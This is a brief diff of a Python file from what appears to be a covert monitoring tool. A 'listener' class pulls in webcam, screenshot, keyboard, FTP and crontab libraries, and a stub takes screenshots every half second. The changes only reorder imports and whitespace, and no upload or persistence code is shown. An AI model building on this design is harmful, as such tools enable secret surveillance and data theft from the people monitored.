@@ -1,13 +1,12 @@
 import os
-import ftplib
 import cv2
 import platform
-import getpass
 import sys
 import threading
 import pyautogui
 import time
 import keyboard
+import getpass
 from ftplib import FTP
 from crontab import CronTab
 
@@ -52,8 +51,7 @@ class listener():
                     del(camera)
         except:
             pass
-                
-    
+
     #screenshots of the screen every .5 seconds
     def computer_screenshot(self):
         #not finished yet
